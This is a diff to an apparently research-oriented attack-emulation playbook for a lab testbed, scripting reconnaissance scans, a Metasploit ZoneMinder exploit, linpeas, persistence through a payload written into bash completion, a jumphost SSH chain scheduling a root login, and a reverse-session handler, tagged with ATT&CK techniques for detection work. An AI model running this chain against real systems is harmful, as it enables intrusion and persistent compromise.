@@ -4,11 +4,13 @@
 #
 ####################
 vars:
-  $SERVER_ADDRESS: 192.42.0.254
+  $SERVER_ADDRESS: video.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
   $ADMIN_SERVER: 10.12.0.222
-  $DOMAIN: aecid-testbed.com
+  $MGMT_IP: 192.42.0.201
+  $MGMT_USERNAME: aecid
+  $DOMAIN: attackbed.com
   $USER: aecid
   $DNS_LIST: /usr/local/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   $SSH_KEY: {{sshkey.public_key}}
@@ -29,7 +31,7 @@ commands:
     metadata:
       techniques: "T1595,T1592.002"
       tactics: "Reconnaissance"
-      technique_name: "Active Scanning,Gather Victim Host Information: Software
+      technique_name: "Active Scanning,Gather Victim Host Information: Software"
 
   - type: shell
     cmd: "nikto -host $SERVER_ADDRESS"
@@ -38,12 +40,20 @@ commands:
       tactics: "Reconnaissance"
       technique_name: "Active Scanning: Vulnerability Scanning"
 
+  # wazuh alerts arrive with delay of up to 15 seconds, therefore wait some time
+  - type: sleep
+    seconds: 30
+
   - type: shell
     cmd: "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
     metadata:
       techniques: "T1595.003"
       tactics: "Reconnaissance"
       technique_name: "Active Scanning: Wordlist Scanning"
+
+  # additional access logs will be produced for around 60 seconds after finishing ffuf, therefore wait some time
+  - type: sleep
+    seconds: 90
 
   - type: msf-module
     cmd: exploit/unix/webapp/zoneminder_snapshots
@@ -62,10 +72,6 @@ commands:
     stdapi: True
     session: "foothold"
     cmd: cd /tmp
-    metadata:
-      techniques: "T1105"
-      tactics: "Command and Control"
-      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -138,7 +144,7 @@ commands:
 
   # wait a little bit for linpeas
   - type: sleep
-    seconds: 380
+    seconds: 600
 
   # This command fixes the outputbuffer
   # so that the output of the further
@@ -157,7 +163,7 @@ commands:
     session: "foothold"
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: msf-session
@@ -165,7 +171,7 @@ commands:
     session: "foothold"
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: msf-session
@@ -173,7 +179,7 @@ commands:
     session: "foothold"
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: msf-session
@@ -181,7 +187,7 @@ commands:
     session: "foothold"
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: msf-session
@@ -189,7 +195,7 @@ commands:
     session: "foothold"
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: msf-session
@@ -197,14 +203,14 @@ commands:
     session: "foothold"
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: sleep
     seconds: 960
     metadata:
       techniques: "T1546"
-      tactics: " Privilege Escalation,Persistence"
+      tactics: "Privilege Escalation,Persistence"
       technique_name: "Event Triggered Execution"
 
   - type: msf-session
@@ -216,13 +222,10 @@ commands:
     cmd: "cat /var/www/default/payload > /etc/bash_completion.d/accesss.log"
     session: "foothold"
 
-  - type: ssh
-    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute
-    hostname: $ADMIN_SERVER
-    username: aecid
-    password: aecid
-    jmp_hostname:  192.42.2.42
-    exit_on_error: False
+ # connect via jumphost to admin host, that ssh to videoserver to reboot
+  - type: shell
+    cmd: ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o "ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@$MGMT_IP" aecid@$ADMIN_SERVER 'echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@172.17.100.121 '. /etc/bash_completion'" | at now + 10 minute' 
+
 
   - type: msf-module
     cmd: exploit/multi/handler
@@ -312,3 +315,5 @@ commands:
       tactics: "Defense Evasion, Discovery"
       technique_name: "Virtualization/Sandbox Evasion: System Checks"
 
+  - type: sleep
+    seconds: 30
